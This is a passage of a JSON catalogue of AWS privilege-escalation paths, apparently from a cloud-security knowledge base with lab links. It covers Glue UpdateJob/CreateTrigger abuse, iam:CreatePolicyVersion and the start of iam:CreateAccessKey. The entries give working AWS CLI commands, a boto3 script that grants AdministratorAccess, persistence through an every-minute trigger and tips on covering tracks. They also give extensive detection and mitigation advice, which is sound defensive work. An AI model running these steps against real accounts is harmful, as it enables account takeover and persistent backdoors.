    "recommendation": "**Restrict PassRole permissions:** Never grant `iam:PassRole` with wildcards. Use resource-based conditions to limit which roles can be passed and to which services:\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"iam:PassRole\",\n  \"Resource\": \"arn:aws:iam::*:role/approved-glue-roles-*\",\n  \"Condition\": {\n    \"StringEquals\": {\n      \"iam:PassedToService\": \"glue.amazonaws.com\"\n    }\n  }\n}\n```\n\n**Implement SCPs to prevent privilege escalation:** Use Service Control Policies to deny PassRole on administrative roles to Glue services:\n\n```json\n{\n  \"Effect\": \"Deny\",\n  \"Action\": \"iam:PassRole\",\n  \"Resource\": [\n    \"arn:aws:iam::*:role/*admin*\",\n    \"arn:aws:iam::*:role/*Admin*\"\n  ],\n  \"Condition\": {\n    \"StringEquals\": {\n      \"iam:PassedToService\": \"glue.amazonaws.com\"\n    }\n  }\n}\n```\n\n**Separate CreateJob and UpdateJob permissions:** Grant `glue:CreateJob` and `glue:UpdateJob` to different personas. Data engineers who create new ETL jobs shouldn't necessarily have permission to modify all existing jobs.\n\n**Monitor CloudTrail for Glue job updates:** Alert on `UpdateJob` API calls, especially when:\n- The `Role` parameter changes to a more privileged role\n- The `ScriptLocation` parameter changes to a different S3 bucket\n- UpdateJob is followed quickly by StartJobRun (< 5 minutes)\n- Updates are performed by users who don't typically manage Glue resources\n- Changes occur outside of approved change windows\n\n**Implement configuration baselines:** Use AWS Config rules to track approved configurations for each Glue job:\n- Monitor for role ARN changes\n- Alert on script location changes from trusted S3 buckets\n- Detect jobs running with administrative policies\n- Enforce tagging requirements for all jobs\n\n**Restrict glue:UpdateJob permissions:** Only grant these permissions to users who legitimately need to modify Glue jobs. Consider requiring approval workflows for job configuration changes.\n\n**Restrict script locations:** Use SCPs or IAM conditions to require all Glue job scripts to be stored in approved, audited S3 buckets. Monitor S3 buckets containing Glue scripts for unauthorized modifications.\n\n**Monitor IAM policy changes from Glue service principal:** Set up CloudWatch alarms for IAM policy modifications (`AttachUserPolicy`, `AttachRolePolicy`) where the source is the Glue service principal.\n\n**Use IAM Access Analyzer:** Enable IAM Access Analyzer to automatically detect privilege escalation paths involving PassRole and Glue services. Review findings regularly and remediate identified risks.\n\n**Implement least privilege for Glue roles:** When creating IAM roles for Glue services, grant only the minimum permissions required for the specific ETL tasks. Avoid using administrative policies like `AdministratorAccess`. Typical Glue jobs need S3, Glue Data Catalog, and CloudWatch Logs access\u2014not IAM permissions.\n",
    "discoveredBy": {
      "name": "Carlos Polop",
      "organization": "HackTricks",
      "date": "Unknown"
    },
    "references": [
      {
        "title": "HackTricks - AWS Glue Privilege Escalation",
        "url": "https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-privilege-escalation/aws-glue-privesc/index.html"
      },
      {
        "title": "Rhino Security Labs - CloudGoat Glue_privesc Walkthrough",
        "url": "https://rhinosecuritylabs.com/cloud-security/cloudgoat-walkthrough-glue_privesc/"
      },
      {
        "title": "CloudGoat - glue_privesc Scenario",
        "url": "https://github.com/RhinoSecurityLabs/cloudgoat/tree/master/cloudgoat/scenarios/aws/glue_privesc"
      },
      {
        "title": "AWS Glue UpdateJob API Documentation",
        "url": "https://docs.aws.amazon.com/glue/latest/webapi/API_UpdateJob.html"
      },
      {
        "title": "AWS Glue Jobs Documentation",
        "url": "https://docs.aws.amazon.com/glue/latest/dg/author-job.html"
      },
      {
        "title": "AWS IAM PassRole Documentation",
        "url": "https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_use_passrole.html"
      }
    ],
    "relatedPaths": [
      "glue-001",
      "glue-002",
      "glue-003",
      "glue-004",
      "glue-006",
      "lambda-001",
      "ec2-001"
    ],
    "learningEnvironments": {
      "pathfinder-labs": {
        "type": "open-source",
        "githubLink": "https://github.com/DataDog/pathfinder-labs",
        "scenario": "privesc-one-hop/to-admin/iam-passrole+glue-updatejob+glue-startjobrun",
        "description": "Deploy Terraform into your own AWS account to practice this attack path"
      }
    },
    "attackVisualization": {
      "nodes": [
        {
          "id": "start",
          "label": "Starting Principal",
          "type": "principal",
          "description": "The principal with `iam:PassRole`, `glue:UpdateJob`, and `glue:StartJobRun` permissions. Can be an IAM user or role.\n\nThis principal can modify existing Glue jobs, pass IAM roles to them, and manually trigger their execution. The ability to update existing jobs makes this attack stealthier than creating new resources.\n"
        },
        {
          "id": "existing_job",
          "label": "Existing Glue Job",
          "type": "resource",
          "description": "A pre-existing AWS Glue job already deployed in the environment. This job is part of normal production infrastructure running legitimate ETL workloads.\n\n**Stealth Factor**: The attacker modifies this existing job rather than creating a new suspicious resource. The update changes:\n- **Role**: From non-privileged service role to privileged target role (via iam:PassRole)\n- **Script**: From benign production script to malicious escalation script\n\n```bash\naws glue update-job \\\n  --job-name existing-job-name \\\n  --job-update \"Role=arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE,Command={Name=pythonshell,ScriptLocation=s3://bucket/escalation_script.py,PythonVersion=3.9}\"\n```\n\nUpdateJob events are common in production and blend in with normal maintenance activities.\n"
        },
        {
          "id": "target_role",
          "label": "Existing Role That Trusts the glue Service",
          "type": "resource",
          "description": "The privileged IAM role that is passed to the Glue job during the update. This role must have a trust policy allowing glue.amazonaws.com to assume it.\n\nWhen the updated job runs, it assumes this role and receives temporary credentials. The permissions of this role determine what the malicious script can accomplish.\n"
        },
        {
          "id": "execute_code",
          "label": "Execute Code with Target Role Permissions",
          "type": "action",
          "description": "The starting principal manually triggers execution of the modified job:\n\n```bash\naws glue start-job-run --job-name existing-job-name\n```\n\nThe job executes in the AWS Glue managed environment with the target role's credentials. The malicious Python script runs and attempts to modify IAM permissions:\n\n```python\nimport boto3\niam = boto3.client('iam')\niam.attach_user_policy(\n    UserName='starting-principal',\n    PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'\n)\n```\n\n**Stealth**: From CloudTrail logs, this looks like a normal execution of an existing production job.\n"
        },
        {
          "id": "admin",
          "label": "Effective Administrator",
          "type": "outcome",
          "description": "The target role has administrative permissions (e.g., AdministratorAccess or iam:* permissions). The Python script successfully uses these permissions to attach the AdministratorAccess policy to the starting principal.\n\nThe starting principal now has full administrative access to the AWS account. The attacker can optionally restore the job to its original configuration to cover their tracks.\n"
        },
        {
          "id": "some_perms",
          "label": "Some Additional Access",
          "type": "outcome",
          "color": "#ffeb99",
          "description": "The target role has some elevated permissions but not full IAM write access. The script may gain access to:\n- Sensitive data in S3, databases, or other AWS services\n- Secrets in AWS Secrets Manager or Parameter Store\n- Multi-hop privilege escalation opportunities\n"
        },
        {
          "id": "no_perms",
          "label": "No Additional Access",
          "type": "outcome",
          "color": "#cccccc",
          "description": "The target role has only minimal permissions (e.g., basic Glue service permissions). The script cannot perform meaningful privilege escalation, though it demonstrates a security gap in job update permissions.\n"
        }
      ],
      "edges": [
        {
          "from": "start",
          "to": "existing_job",
          "label": "glue:UpdateJob + glue:StartJobRun",
          "description": "The starting principal uses `glue:UpdateJob` to modify an existing Glue job, changing its execution role (via `iam:PassRole`) and script location to point to a malicious Python script. Then uses `glue:StartJobRun` to execute the modified job.\n\nThis is a **stealth technique** because:\n- Modifies existing infrastructure rather than creating new resources\n- UpdateJob events are routine in production environments\n- Job executions look like normal operational activity\n"
        },
        {
          "from": "existing_job",
          "to": "target_role",
          "label": "Job assumes passed role",
          "description": "When the job starts executing, it automatically assumes the target role that was passed during the update. The Glue service requests temporary credentials from AWS STS for this role.\n\nThe job now has all the permissions granted to the target role.\n"
        },
        {
          "from": "target_role",
          "to": "execute_code",
          "label": "Script executes with role permissions",
          "description": "The malicious Python script executes in the Glue job environment with the temporary credentials from the target role. The script uses boto3 to interact with AWS APIs and attempt privilege escalation.\n\nThe script's success depends entirely on what permissions the target role has.\n"
        },
        {
          "from": "execute_code",
          "to": "admin",
          "label": "If role has IAM write permissions",
          "branch": "A",
          "condition": "admin",
          "description": "If the target role has AdministratorAccess or `iam:AttachUserPolicy` permission, the script successfully attaches the AdministratorAccess policy to the starting principal.\n\nThe starting principal now has full administrative access.\n"
        },
        {
          "from": "execute_code",
          "to": "some_perms",
          "label": "If role has some elevated permissions",
          "branch": "B",
          "condition": "some_permissions",
          "description": "If the target role has elevated permissions but not IAM write access, the attacker gains partial access such as reading sensitive data or accessing other AWS services.\n"
        },
        {
          "from": "execute_code",
          "to": "no_perms",
          "label": "If role has minimal permissions",
          "branch": "C",
          "condition": "no_permissions",
          "description": "If the target role only has basic Glue service permissions, the script cannot perform meaningful privilege escalation.\n"
        }
      ]
    },
    "gitMetadata": {
      "created": "2025-11-05T19:56:13Z",
      "lastUpdated": "2025-11-11T19:29:07Z",
      "contributors": [
        {
          "name": "Seth Art",
          "email": "seth.art@datadoghq.com",
          "githubUsername": "sethsec"
        }
      ]
    },
    "filePath": "data/paths/glue/glue-005.yaml"
  },
  {
    "id": "glue-006",
    "name": "iam:PassRole + glue:UpdateJob + glue:CreateTrigger",
    "category": "service-passrole",
    "services": [
      "iam",
      "glue"
    ],
    "permissions": {
      "required": [
        {
          "permission": "iam:PassRole",
          "resourceConstraints": "Must be able to pass a role to glue.amazonaws.com"
        },
        {
          "permission": "glue:UpdateJob",
          "resourceConstraints": "Must be able to update existing Glue job configurations"
        },
        {
          "permission": "glue:CreateTrigger",
          "resourceConstraints": "Must be able to create Glue triggers with --start-on-creation flag"
        }
      ],
      "additional": [
        {
          "permission": "glue:GetJob",
          "resourceConstraints": "Helpful for retrieving current job configuration before modification"
        },
        {
          "permission": "glue:ListJobs",
          "resourceConstraints": "Useful for discovering existing Glue jobs that can be modified"
        },
        {
          "permission": "glue:GetTrigger",
          "resourceConstraints": "Helpful for monitoring trigger state and activation status"
        },
        {
          "permission": "glue:GetJobRun",
          "resourceConstraints": "Useful for monitoring job execution details"
        },
        {
          "permission": "glue:GetJobRuns",
          "resourceConstraints": "Helpful for listing job runs to track execution history"
        },
        {
          "permission": "iam:ListRoles",
          "resourceConstraints": "Useful for discovering available privileged roles to pass"
        },
        {
          "permission": "iam:GetRole",
          "resourceConstraints": "Helpful for viewing role trust policies and attached permissions"
        }
      ]
    },
    "description": "A principal with `iam:PassRole`, `glue:UpdateJob`, and `glue:CreateTrigger` can modify an existing AWS Glue job to use an administrative role and execute malicious code, then establish a scheduled trigger for persistent automated execution. This scenario demonstrates a stealthy privilege escalation vulnerability that combines the stealth of updating existing infrastructure with the persistence of scheduled automation. Unlike `glue:CreateJob` which creates new resources that may raise alerts, `glue:UpdateJob` modifies existing infrastructure, making detection significantly more difficult. Organizations commonly have dozens or hundreds of Glue jobs running legitimate data pipelines, and updating existing jobs is a common maintenance activity. When an attacker updates an existing job's execution role and script location, then creates a trigger with the `--start-on-creation` flag, they establish automated privilege escalation that executes on a schedule (e.g., every minute). The update-based approach with persistence is particularly dangerous because it blends into normal operations while creating a persistent backdoor. The attacker modifies an existing job to use a privileged role and malicious script, creates a scheduled trigger that immediately activates, and the trigger automatically executes the job which runs Python code that modifies IAM permissions to grant the starting principal administrative access. The trigger continues to run on schedule, re-granting access even if remediated.",
    "prerequisites": {
      "admin": [
        "An existing Glue job must be present in the environment that can be modified",
        "A role must exist that trusts glue.amazonaws.com to assume it",
        "The role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)"
      ],
      "lateral": [
        "An existing Glue job must be present in the environment that can be modified",
        "A role must exist that trusts glue.amazonaws.com to assume it",
        "The role's permissions determine the level of access gained"
      ]
    },
    "limitations": "This path requires a pre-existing Glue job to modify, unlike glue:CreateJob which can be executed in any environment. The path provides administrative access only if the passed role has administrative permissions (e.g., AdministratorAccess policy). If only limited roles are available in the environment, you gain access limited to those role's permissions. However, even limited access may enable multi-hop attacks or access to sensitive data. The level of access depends entirely on the permissions of the role that can be passed to the Glue service. The persistent nature of triggers means access can be re-granted even after remediation attempts if the trigger is not identified and removed. This technique is harder to detect than CreateJob because job updates are routine operational activities that blend in with normal maintenance.\n",
    "exploitationSteps": {
      "awscli": [
        {
          "step": 1,
          "command": "# List existing Glue jobs to find one to modify\naws glue list-jobs --region us-east-1\n",
          "description": "Discover existing Glue jobs in the environment. Choose a job that you have permission to update. Jobs that run infrequently or are not actively monitored are ideal targets for stealth."
        },
        {
          "step": 2,
          "command": "# View current job configuration\naws glue get-job \\\n  --region us-east-1 \\\n  --job-name existing-job-name \\\n  --query 'Job.{Role: Role, Script: Command.ScriptLocation}'\n",
          "description": "Retrieve the current job configuration to see its existing role and script location. Document these values if you need to restore the job after the attack to cover your tracks."
        },
        {
          "step": 3,
          "command": "# Create Python script that attaches admin policy (upload to S3)\n# Example script content:\nimport boto3\niam = boto3.client('iam')\niam.attach_user_policy(\n    UserName='target-username',\n    PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'\n)\n",
          "description": "Prepare a Python script that will attach AdministratorAccess policy to your starting principal. Upload this script to an S3 bucket that the Glue job can access."
        },
        {
          "step": 4,
          "command": "aws glue update-job \\\n  --region us-east-1 \\\n  --job-name existing-job-name \\\n  --job-update \"Role=arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE,Command={Name=pythonshell,ScriptLocation=s3://bucket/escalation_script.py,PythonVersion=3.9}\"\n",
          "description": "Update the existing Glue job to use the privileged role and point to your malicious script. The Role parameter uses iam:PassRole to assign the administrative role. The ScriptLocation is changed to your escalation script. This modification blends in with normal maintenance activities."
        },
        {
          "step": 5,
          "command": "aws glue create-trigger \\\n  --region us-east-1 \\\n  --name privesc-trigger \\\n  --type SCHEDULED \\\n  --start-on-creation \\\n  --schedule \"cron(0/1 * * * ? *)\" \\\n  --actions '[{\"JobName\": \"existing-job-name\"}]'\n",
          "description": "Create a scheduled trigger with --start-on-creation flag for the modified job. This immediately activates the trigger and schedules the job to run every minute. The trigger will fire at the next scheduled time and execute the malicious job automatically without requiring glue:StartJobRun permission."
        },
        {
          "step": 6,
          "command": "# Wait 1-3 minutes for trigger to fire and job to complete\naws glue get-trigger \\\n  --region us-east-1 \\\n  --name privesc-trigger \\\n  --query 'Trigger.State'\n",
          "description": "Verify the trigger state shows ACTIVATED. Scheduled triggers fire at the next scheduled time (every minute in this case). Wait for the job to execute automatically."
        },
        {
          "step": 7,
          "command": "aws glue get-job-runs \\\n  --region us-east-1 \\\n  --job-name existing-job-name \\\n  --max-results 1 \\\n  --query 'JobRuns[0].JobRunState'\n",
          "description": "Check the latest job run to confirm it has executed. Wait for JobRunState to show SUCCEEDED, indicating your script has completed and administrative access has been granted."
        },
        {
          "step": 8,
          "command": "# Wait 15 seconds for IAM policy propagation\nsleep 15\n# Verify admin access\naws iam list-users\n",
          "description": "After the job completes and IAM changes propagate, verify that you now have administrative permissions. Note that the trigger will continue to run every minute, re-granting access even if it's removed, establishing persistent administrative access."
        }
      ]
    },
    "recommendation": "**Restrict PassRole permissions:** Never grant `iam:PassRole` with wildcards. Use resource-based conditions to limit which roles can be passed and to which services:\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"iam:PassRole\",\n  \"Resource\": \"arn:aws:iam::*:role/approved-glue-roles-*\",\n  \"Condition\": {\n    \"StringEquals\": {\n      \"iam:PassedToService\": \"glue.amazonaws.com\"\n    }\n  }\n}\n```\n\n**Implement SCPs to prevent privilege escalation:** Use Service Control Policies to deny PassRole on administrative roles to Glue services:\n\n```json\n{\n  \"Effect\": \"Deny\",\n  \"Action\": \"iam:PassRole\",\n  \"Resource\": [\n    \"arn:aws:iam::*:role/*admin*\",\n    \"arn:aws:iam::*:role/*Admin*\"\n  ],\n  \"Condition\": {\n    \"StringEquals\": {\n      \"iam:PassedToService\": \"glue.amazonaws.com\"\n    }\n  }\n}\n```\n\n**Monitor CloudTrail for Glue job updates and trigger creation:** Alert on `UpdateJob` and `CreateTrigger` API calls, especially when:\n- The execution role is changed to a more privileged role\n- Script location is modified to point to external or suspicious buckets\n- Combined with PassRole on privileged roles\n- Triggers are created with `StartOnCreation=true` immediately after job updates\n- Execution intervals are suspiciously frequent (every minute)\n- Jobs are updated by users who don't typically work with Glue\n\n**Restrict glue:UpdateJob and glue:CreateTrigger permissions:** Only grant these permissions to users who legitimately need to modify ETL workflows (data engineers, DevOps). Consider these actions more sensitive than read-only Glue permissions.\n\n**Separate CreateJob and UpdateJob permissions:** Grant `glue:CreateJob` and `glue:UpdateJob` to different personas when possible. Implement approval workflows for job configuration changes.\n\n**Implement configuration baselines:** Use AWS Config rules to track approved configurations for each Glue job and alert on role ARN changes, script location changes, or jobs running with administrative policies.\n\n**Limit trigger scheduling frequencies:** Implement organizational policies or SCPs that prevent creation of triggers with very frequent schedules (e.g., every minute), as these are often indicators of abuse rather than legitimate ETL workflows.\n\n**Monitor IAM policy changes from Glue service principal:** Set up CloudWatch alarms for IAM policy modifications (`AttachUserPolicy`, `AttachRolePolicy`, `PutUserPolicy`, `PutRolePolicy`) where the source is the Glue service principal.\n\n**Implement change detection:** Use AWS Config or third-party tools to detect when Glue job configurations change and alert when job role ARN or script location changes.\n\n**Use IAM Access Analyzer:** Enable IAM Access Analyzer to automatically detect privilege escalation paths involving PassRole and Glue services. Review findings regularly and remediate identified risks.\n\n**Implement least privilege for Glue roles:** When creating IAM roles for Glue services, grant only the minimum permissions required for the specific ETL tasks. Avoid using administrative policies like `AdministratorAccess`. Typical Glue jobs need S3, Glue Data Catalog, and CloudWatch Logs access\u2014not IAM permissions.\n",
    "discoveredBy": {
      "name": "Carlos Polop",
      "organization": "HackTricks",
      "date": "Unknown"
    },
    "references": [
      {
        "title": "HackTricks - AWS Glue Privilege Escalation",
        "url": "https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-privilege-escalation/aws-glue-privesc/index.html"
      },
      {
        "title": "Rhino Security Labs - CloudGoat Glue_privesc Walkthrough",
        "url": "https://rhinosecuritylabs.com/cloud-security/cloudgoat-walkthrough-glue_privesc/"
      },
      {
        "title": "CloudGoat - glue_privesc Scenario",
        "url": "https://github.com/RhinoSecurityLabs/cloudgoat/tree/master/cloudgoat/scenarios/aws/glue_privesc"
      },
      {
        "title": "AWS Glue UpdateJob API Documentation",
        "url": "https://docs.aws.amazon.com/glue/latest/webapi/API_UpdateJob.html"
      },
      {
        "title": "AWS Glue CreateTrigger API Documentation",
        "url": "https://docs.aws.amazon.com/glue/latest/webapi/API_CreateTrigger.html"
      },
      {
        "title": "AWS IAM PassRole Documentation",
        "url": "https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_use_passrole.html"
      }
    ],
    "relatedPaths": [
      "glue-001",
      "glue-002",
      "glue-003",
      "glue-004",
      "glue-005",
      "lambda-001",
      "ec2-001"
    ],
    "detectionTools": {
      "pacu": "https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu/modules/iam__privesc_scan/main.py#L550"
    },
    "learningEnvironments": {
      "pathfinder-labs": {
        "type": "open-source",
        "githubLink": "https://github.com/DataDog/pathfinder-labs",
        "scenario": "privesc-one-hop/to-admin/iam-passrole+glue-updatejob+glue-createtrigger",
        "description": "Deploy Terraform into your own AWS account to practice this attack path"
      }
    },
    "attackVisualization": {
      "nodes": [
        {
          "id": "start",
          "label": "Starting Principal",
          "type": "principal",
          "description": "The principal with `iam:PassRole`, `glue:UpdateJob`, and `glue:CreateTrigger` permissions. Can be an IAM user or role.\n\nThis principal can modify existing Glue jobs, pass IAM roles to them, and create scheduled triggers for automated execution. This combination provides both **stealth** (modifying existing infrastructure) and **persistence** (automated recurring execution).\n"
        },
        {
          "id": "existing_job",
          "label": "Existing Glue Job",
          "type": "resource",
          "description": "A pre-existing AWS Glue job already deployed in the environment. This job is part of normal production infrastructure running legitimate ETL workloads.\n\n**Stealth Factor**: The attacker modifies this existing job rather than creating a new suspicious resource. The update changes:\n- **Role**: From non-privileged service role to privileged target role (via iam:PassRole)\n- **Script**: From benign production script to malicious escalation script\n\n**Persistence Factor**: After updating the job, the attacker creates a scheduled trigger that automatically executes it every minute.\n\n```bash\n# Update the job\naws glue update-job \\\n  --job-name existing-job-name \\\n  --job-update \"Role=arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE,Command={Name=pythonshell,ScriptLocation=s3://bucket/escalation_script.py,PythonVersion=3.9}\"\n\n# Create trigger for persistence\naws glue create-trigger \\\n  --name privesc-trigger \\\n  --type SCHEDULED \\\n  --start-on-creation \\\n  --schedule \"cron(0/1 * * * ? *)\" \\\n  --actions '[{\"JobName\": \"existing-job-name\"}]'\n```\n\nUpdateJob events are common in production and blend in with normal maintenance activities. The trigger makes this attack persistent.\n"
        },
        {
          "id": "target_role",
          "label": "Existing Role That Trusts the glue Service",
          "type": "resource",
          "description": "The privileged IAM role that is passed to the Glue job during the update. This role must have a trust policy allowing glue.amazonaws.com to assume it.\n\nWhen the updated job runs (triggered automatically every minute), it assumes this role and receives temporary credentials. The permissions of this role determine what the malicious script can accomplish.\n"
        },
        {
          "id": "execute_code",
          "label": "Execute Code with Target Role Permissions",
          "type": "action",
          "description": "The scheduled trigger fires automatically (every minute) and starts the modified job. No manual `glue:StartJobRun` is needed.\n\nThe job executes in the AWS Glue managed environment with the target role's credentials. The malicious Python script runs repeatedly on each trigger activation:\n\n```python\nimport boto3\niam = boto3.client('iam')\niam.attach_user_policy(\n    UserName='starting-principal',\n    PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'\n)\n```\n\n**Combined Stealth + Persistence**: The job looks like normal production infrastructure executing on schedule, making this attack particularly difficult to detect. Even if the policy attachment is removed, it will be re-applied when the trigger fires again.\n"
        },
        {
          "id": "admin",
          "label": "Effective Administrator + Persistent Backdoor",
          "type": "outcome",
          "description": "The target role has administrative permissions (e.g., AdministratorAccess or iam:* permissions). The Python script successfully uses these permissions to attach the AdministratorAccess policy to the starting principal.\n\n**Persistence**: The trigger continues to fire every minute, re-granting administrative access even if the policy attachment is manually removed. This creates a persistent backdoor that is difficult to remediate without identifying and deleting both the trigger and restoring the job configuration.\n\n**Stealth**: The attack uses existing infrastructure (modified job) rather than creating new resources, blending in with normal operations.\n"
        },
        {
          "id": "some_perms",
          "label": "Some Additional Access + Persistence",
          "type": "outcome",
          "color": "#ffeb99",
          "description": "The target role has some elevated permissions but not full IAM write access. The script may gain access to:\n- Sensitive data in S3, databases, or other AWS services\n- Secrets in AWS Secrets Manager or Parameter Store\n- Multi-hop privilege escalation opportunities\n\n**Persistence**: The trigger continues to fire every minute, repeatedly performing these actions on schedule.\n"
        },
        {
          "id": "no_perms",
          "label": "No Additional Access",
          "type": "outcome",
          "color": "#cccccc",
          "description": "The target role has only minimal permissions (e.g., basic Glue service permissions). The script cannot perform meaningful privilege escalation.\n\nHowever, the trigger continues to fire every minute, consuming resources and demonstrating a security gap.\n"
        }
      ],
      "edges": [
        {
          "from": "start",
          "to": "existing_job",
          "label": "glue:UpdateJob + glue:CreateTrigger",
          "description": "The starting principal uses `glue:UpdateJob` to modify an existing Glue job, changing its execution role (via `iam:PassRole`) and script location to point to a malicious Python script. Then uses `glue:CreateTrigger` with `--start-on-creation` to create a scheduled trigger that fires every minute.\n\nThis is a **combined stealth + persistence technique**:\n- **Stealth**: Modifies existing infrastructure rather than creating new resources; UpdateJob events are routine in production\n- **Persistence**: Scheduled trigger automatically executes the job every minute without manual intervention\n- Job executions look like normal operational activity\n"
        },
        {
          "from": "existing_job",
          "to": "target_role",
          "label": "Job assumes passed role",
          "description": "When the trigger fires and the job starts executing, it automatically assumes the target role that was passed during the update. The Glue service requests temporary credentials from AWS STS for this role.\n\nThe job now has all the permissions granted to the target role.\n"
        },
        {
          "from": "target_role",
          "to": "execute_code",
          "label": "Script executes with role permissions",
          "description": "The malicious Python script executes in the Glue job environment with the temporary credentials from the target role. The script uses boto3 to interact with AWS APIs and attempt privilege escalation.\n\nThis happens **repeatedly every minute** as the trigger continues to fire, providing persistence.\n"
        },
        {
          "from": "execute_code",
          "to": "admin",
          "label": "If role has IAM write permissions",
          "branch": "A",
          "condition": "admin",
          "description": "If the target role has AdministratorAccess or `iam:AttachUserPolicy` permission, the script successfully attaches the AdministratorAccess policy to the starting principal.\n\nThe trigger continues to fire every minute, making this a **persistent backdoor** that re-grants admin access even if manually removed.\n"
        },
        {
          "from": "execute_code",
          "to": "some_perms",
          "label": "If role has some elevated permissions",
          "branch": "B",
          "condition": "some_permissions",
          "description": "If the target role has elevated permissions but not IAM write access, the attacker gains partial access such as reading sensitive data or accessing other AWS services.\n\nThe trigger provides persistence, repeatedly performing these actions every minute.\n"
        },
        {
          "from": "execute_code",
          "to": "no_perms",
          "label": "If role has minimal permissions",
          "branch": "C",
          "condition": "no_permissions",
          "description": "If the target role only has basic Glue service permissions, the script cannot perform meaningful privilege escalation.\n\nHowever, the trigger continues firing every minute, demonstrating a security gap.\n"
        }
      ]
    },
    "gitMetadata": {
      "created": "2025-11-05T19:56:13Z",
      "lastUpdated": "2025-11-11T19:29:07Z",
      "contributors": [
        {
          "name": "Seth Art",
          "email": "seth.art@datadoghq.com",
          "githubUsername": "sethsec"
        }
      ]
    },
    "filePath": "data/paths/glue/glue-006.yaml"
  },
  {
    "id": "iam-001",
    "name": "iam:CreatePolicyVersion",
    "category": "self-escalation",
    "services": [
      "iam"
    ],
    "description": "Anyone with access to `iam:CreatePolicyVersion` can create a new version of an IAM policy. If a user can create a new version of a policy that is already attached to them, they can grant themselves administrative privileges by creating a new policy version with elevated permissions and setting it as the default version. A principal can also leverage this to escalate the permissions of another principal they can access.",
    "prerequisites": {
      "admin": [
        "Policy must already be attached to the actor's user, role, or group"
      ],
      "lateral": [
        "Policy must already be attached to the actor's user, role, or group"
      ]
    },
    "exploitationSteps": {
      "awscli": [
        {
          "step": 1,
          "command": "aws iam create-policy-version --policy-arn @arn --policy-document file://admin_policy.json --set-as-default",
          "description": "Create a new policy version with administrative permissions and set it as default"
        }
      ],
      "pacu": [
        {
          "step": 1,
          "command": "run iam__privesc_scan",
          "description": "Scan for IAM privilege escalation opportunities including CreatePolicyVersion"
        }
      ]
    },
    "recommendation": "Restrict access to `iam:CreatePolicyVersion` using the principle of least privilege.\nVery few principals need this permission, so it should be restricted to only the\nfew principals that need it. Monitor use of this sensitive permission using\nCloudSIEM detections, and look for usage anomalies.\n",
    "discoveredBy": {
      "name": "Spencer Gietzen",
      "organization": "Rhino Security Labs",
      "date": "2019"
    },
    "references": [
      {
        "title": "AWS Privilege Escalation Methods and Mitigation",
        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
      }
    ],
    "relatedPaths": [
      "iam-007",
      "iam-008"
    ],
    "detectionTools": {
      "cloudsplaining": "https://github.com/salesforce/cloudsplaining/blob/master/cloudsplaining/shared/constants.py#L107",
      "pacu": "https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu/modules/iam__privesc_scan/main.py#L282",
      "prowler": "https://github.com/prowler-cloud/prowler/blob/master/prowler/providers/aws/services/iam/lib/privilege_escalation.py#L32"
    },
    "detectionRules": [
      {
        "platform": "CloudSIEM",
        "url": "https://docs.datadoghq.com/security/default_rules/7b6-2a8-df9/"
      }
    ],
    "learningEnvironments": {
      "pathfinder-labs": {
        "type": "open-source",
        "githubLink": "https://github.com/DataDog/pathfinder-labs",
        "scenario": "privesc-self-escalation/to-admin/iam-createpolicyversion",
        "description": "Deploy Terraform into your own AWS account to practice this attack path"
      },
      "iam-vulnerable": {
        "type": "open-source",
        "githubLink": "https://github.com/BishopFox/iam-vulnerable",
        "scenario": "IAM-CreateNewPolicyVersion",
        "description": "Deploy Terraform into your own AWS account and practice individual exploitation paths"
      }
    },
    "attackVisualization": {
      "nodes": [
        {
          "id": "start",
          "label": "Starting Principal",
          "type": "principal",
          "description": "The principal initiating the attack. Can be an IAM user or role that has an IAM policy already attached to them (directly, via group, or inline). Must have iam:CreatePolicyVersion permission on that policy.\n"
        },
        {
          "id": "attached_policy",
          "label": "Existing attached-policy",
          "type": "resource",
          "description": "An IAM customer managed policy that is already attached to the starting principal (directly, via group, or inline). The principal must have iam:CreatePolicyVersion permission for this specific policy ARN.\n"
        },
        {
          "id": "admin",
          "label": "Effective Administrator",
          "type": "outcome",
          "description": "The new policy version is now the default and automatically takes effect. The starting principal immediately gains all permissions specified in the new policy version, including full administrative access if that was included.\n"
        }
      ],
      "edges": [
        {
          "from": "start",
          "to": "attached_policy",
          "label": "Has policy attached",
          "description": "The starting principal must already have a customer managed policy attached to them (directly, via their role, or via a group they belong to). This is a prerequisite for the attack.\n"
        },
        {
          "from": "attached_policy",
          "to": "admin",
          "label": "iam:CreatePolicyVersion",
          "description": "Execute the iam:CreatePolicyVersion API call to create a new version of the attached policy. Include a policy document with administrative permissions and use --set-as-default to make it active immediately.\n\nExample command:\naws iam create-policy-version --policy-arn @arn --policy-document file://admin_policy.json --set-as-default\n\nThe new policy version becomes the default and takes effect immediately. All principals with this policy attached (including the attacker) now have the permissions specified in the new version.\n"
        }
      ]
    },
    "permissions": {
      "required": [
        {
          "permission": "iam:CreatePolicyVersion",
          "resourceConstraints": "Policy ARN must be in the Resource section and policy must be attached to the actor"
        }
      ]
    },
    "gitMetadata": {
      "created": "2025-10-09T19:58:48Z",
      "lastUpdated": "2025-11-11T19:29:07Z",
      "contributors": [
        {
          "name": "Seth Art",
          "email": "seth.art@datadoghq.com",
          "githubUsername": "sethsec"
        }
      ]
    },
    "filePath": "data/paths/iam/iam-001.yaml"
  },
  {
    "id": "iam-002",
    "name": "iam:CreateAccessKey",
    "category": "lateral-movement",
    "services": [
      "iam"
    ],
    "description": "Anyone with access to `iam:CreateAccessKey` can create access keys for any user they have this permission on. This permission is often abused by one principal to gain access to another principal and the permissions associated with that principal.",
    "prerequisites": {
      "admin": [
        "Target user must have fewer than 2 access keys already",
        "Target user must have administrative permissions (e.g., AdministratorAccess)"
      ],
      "lateral": [
